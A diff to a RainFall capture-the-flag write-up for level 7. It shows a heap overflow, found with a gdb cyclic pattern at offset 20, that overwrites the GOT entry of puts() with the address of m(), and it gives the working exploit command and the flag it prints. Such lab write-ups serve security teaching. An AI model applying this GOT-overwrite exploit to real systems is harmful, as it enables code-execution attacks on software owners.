@@ -44,7 +44,7 @@ m() is not called in main(), so we gone redirect execution to it.
 
 We’ll do that by overwriting the GOT entry for puts(), with the address of m().
 
-The address of function m()
+- The address of function m()
 
 ```
     (gdb) info functions
@@ -84,22 +84,21 @@ The address of function m()
 
 the address of function m() is 0x080484f4 in little-indian "\xf4\x84\x04\x08"
 
-
 ```
-    (gdb) run hhhhhhhhbbbbbbbbcccccc j
-    Starting program: /home/user/level7/level7 hhhhhhhhbbbbbbbbcccccc j
+    End of assembler dump.
+    (gdb) 
+    (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+    Starting program: /home/user/level7/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
     Program received signal SIGSEGV, Segmentation fault.
-    0xb7eb8f23 in ?? () from /lib/i386-linux-gnu/libc.so.6
+    0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6
+    (gdb) x $eax
+    0x37614136:     Cannot access memory at address 0x37614136
 ```
 
-so we a have heap based overflow:
+so we a have heap based overflow in the offset 20
 
-```
-    Overflow size = (Address of the target you want to overwrite) − (Start address of your buffer).
-```
-
-The Got entry of puts
+- The Got entry of puts:
 
 ```
     level7@RainFall:~$ objdump -R ./level7 | grep puts
@@ -108,10 +107,8 @@ The Got entry of puts
 
 the address of puts() is 0x08049928 in little-indian "\x28\x99\x04\x08"
 
-8 (buffer) + 4 (second[0]) + 4 (second[1]) = 16 bytes => To write exactly into second[1], we need to send 20 bytes:
-
 ```
     level7@RainFall:~$ ./level7 "$(python -c 'print("A"*20 + "\x28\x99\x04\x08")')" "$(python -c 'print("\xf4\x84\x04\x08")')"
     5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
     - 1746024775
- ```
+```
